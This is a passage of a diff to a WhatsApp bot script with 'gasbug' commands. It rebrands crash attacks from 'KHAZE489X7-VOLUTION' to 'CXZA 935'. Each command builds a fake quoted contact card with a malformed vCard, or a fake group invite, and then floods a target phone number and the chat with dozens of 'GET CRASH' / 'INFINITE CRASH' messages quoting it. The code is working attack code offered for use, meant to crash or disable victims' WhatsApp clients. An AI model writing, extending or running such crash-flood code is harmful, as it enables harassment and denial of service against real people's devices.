+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
  await m.reply(`Succes`)
  break 
 case 'gasbug11':
@@ -6744,69 +6207,39 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fkon1})
 await m.reply(`Succes`)
 break
 case 'gasbug12':
@@ -6822,74 +6255,42 @@ participant: `0@s.whatsapp.net`,
 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇`, 
-"caption": `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇`, 
+"groupName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
 'jpegThumbnail': thumb
 }
 }
 }
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
